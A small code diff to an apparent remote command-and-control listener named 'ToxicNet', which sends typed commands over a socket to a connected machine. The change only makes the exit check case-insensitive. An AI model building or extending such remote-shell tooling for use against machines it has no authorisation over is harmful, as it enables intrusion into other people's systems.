@@ -1,4 +1,4 @@
-import socket, sys, os
+import socket, sys, os, re
 
 def create_socket():
     try:
@@ -37,7 +37,7 @@ def accept():
 def send_cmd(conn):
     while True:
         cmd = input("ToxicNet:>")
-        if cmd == "exit" or cmd == "Exit":
+        if re.search("exit", cmd, re.IGNORECASE):
             conn.send(str.encode(cmd))
             conn.close()
             sock.close()
